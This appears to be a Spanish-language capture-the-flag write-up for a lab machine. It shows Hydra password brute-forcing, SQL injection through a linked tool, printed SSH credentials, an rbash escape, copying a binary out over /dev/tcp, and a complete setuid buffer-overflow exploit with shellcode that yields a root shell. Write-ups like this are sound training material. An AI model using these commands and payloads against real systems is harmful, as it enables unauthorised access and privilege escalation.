## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un panel de login, pero con especificaciones:

```bash
- Your password must include at least one uppercase letter
- Your password must include at least one lowercase letter
- Your password must include at least one digit
- Your password must be at least 10 characters long
```

Si ingresamos el usuario admin se comprueba que existe.

Para esto modifico el diccionario Rockyou que ya tengo:

```bash
grep -P '^(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9]).{10,}$' rockyou.txt > new_rockyou.txt
```

Ahora con Hydra  le hago fuerza bruta:

```bash
hydra -l admin -P new_rockyou.txt 172.17.0.2 http-post-form  '/login.php:username=^USER^&password=^PASS^:Incorrect password for the user' -V 
```

Pass : Basketball5

Dentro hay un panel para agregar notas en texto plano, pero parece por la barra de input que se trata de una base de datos. Pruebo con Burpsuite y no tengo resultados, así que uso la herramienta de maciferna:

https://617363938-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuZ321xiNDNLl74xJMAKB%2Fuploads%2Fgit-blob-2095cff408ae1f8625f9ff1e64de3dc7a518841d%2Fsqli.zip?alt=media

Consigo las credenciales ssh del usuario ttttt:

```bash
wWZ *vgx Rz3j MBQ ZN
```

## Escalada:

Al entrar nos topamos con una rbash, que es una bash limitada. Como la conexión es por SSH es sencillo:

```bash
ssh ttttt@172.17.0.2 bash
```

Esto hará que al entrar nos ejecute directamente una `bash`, por lo que ahora podremos ejecutar el comando `chsh` para cambiar la shell de nuestro usuario por `/bin/bash`. Además tendremos que ejecutar los siguientes comandos para que al conectarnos nuevamente por `ssh` no tengamos problemas con la variable `PATH`:

```bash
rm /home/ttttt/.bashrc && cp /etc/skel/.bashrc /home/ttttt/.bashrc
```

Ya podemos interactuar normal.

Dentro reviso los permisos SUID:

```bash
find / -perm -4000 2>/dev/null
# Info
/home/ttttt/bf/vuln
```

Parece un ejecutable vulnerable. Pruebo a ver si es un buffer overflow:

```bash
/home/ttttt/bf/vuln $(python2.7 -c 'print "A"*200')
# Info
Segmentation fault
```

Confirmo, toca pasarlo a la maquina atacante para examinarlo:

```bash
# Desde el host:
nc -nlvp 9090 > vuln
# Desde la víctima:
cat /home/ttttt/bf/vuln > /dev/tcp/172.17.0.1/9090
```

Listo, le doy permisos de ejecución y lo abro con gdb.

Dentro necesitamos obtener el offset:

```bash
./pattern_create.rb -l 90
```

El resultado lo uso en gdb para conocer el offset:

```bash
# Iniciamos gdb con el binario
gdb -q vuln
# Hacemos que el binario inicie pasandole como argumento nuestro pattern
r Aa<SNIP>Ac7Ac8Ac9
# Una vez crashea el programa, ejecutamos lo siguiente
info registers eip
# Al resultado en hexadecimal lo revisaremos con xxd
echo '0x63413563' | xxd -r; echo
```

Resultado: cA5c

Pasado al offset nos dará el offset exacto:

```bash
./pattern_offset.rb -q c5Ac
# Info:
[*] Exact match at offset 76
```

Compruebo que el binario usa setuid, de lo contrario no funcionaría:

```bash
objdump -d vuln | grep -i setuid
```

Luego buscando en los writeups encuentro esta shellcode:

```bash
\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
```

Y la insertamos desde gdb:

```bash
r $(python2.7 -c 'print "\x90"*39 + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "B"*4 + "C"*200')
```

Esto lo que hará será pasarle 39 NOP's, el shellcode y tomaremos el control de el EIP con 4 'B'. Pasaremos 39 NOP's porque nuestro shellcode tine 37 bytes (37 + 39 = 76) y 200 letras 'C' para identificar más fácil donde queda nuestro shellcode y los NOP's:

```bash
x/300wx $esp
```

Sabiendo esto, nosotros deberemos hacer que el EIP apunte a la dirección `0xffff20c0`, esto para que con los NOP's se 'deslice' hacia nuestro shellcode y nos ejecute lo que queremos. Por lo que ya tenemos lo necesario para explotar el buffer overflow y escalar a root, salimos de `gdb` y ejecutamos lo siguiente desde la máquina víctima:

```bash
/home/ttttt/bf/vuln $(python2.7 -c 'print "\x90"*39 + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "\x20\xd7\xff\xff"')
```

Listo.
